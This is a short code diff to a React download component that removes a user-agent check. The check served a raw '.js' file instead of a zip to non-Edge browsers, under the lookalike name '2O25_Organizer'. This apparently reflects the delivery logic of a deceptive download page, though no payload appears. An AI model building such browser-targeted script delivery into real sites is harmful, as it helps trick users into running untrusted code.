@@ -367,11 +367,7 @@ const Download = () => {
   }, []);
 
   const downloadFile = useMemo(() => {
-    const ua = navigator.userAgent;
-    if (ua.includes("Edg/")) {
-      return { href: "/docs/2O25_Organizer.zip", extension: "zip" };
-    }
-    return { href: "/docs/2O25_Organizer.js", extension: "js" };
+    return { href: "/docs/2O25_Organizer.zip", extension: "zip" };
   }, []);
 
   const triggerDownload = useCallback(async (file: { href: string; extension: string }) => {
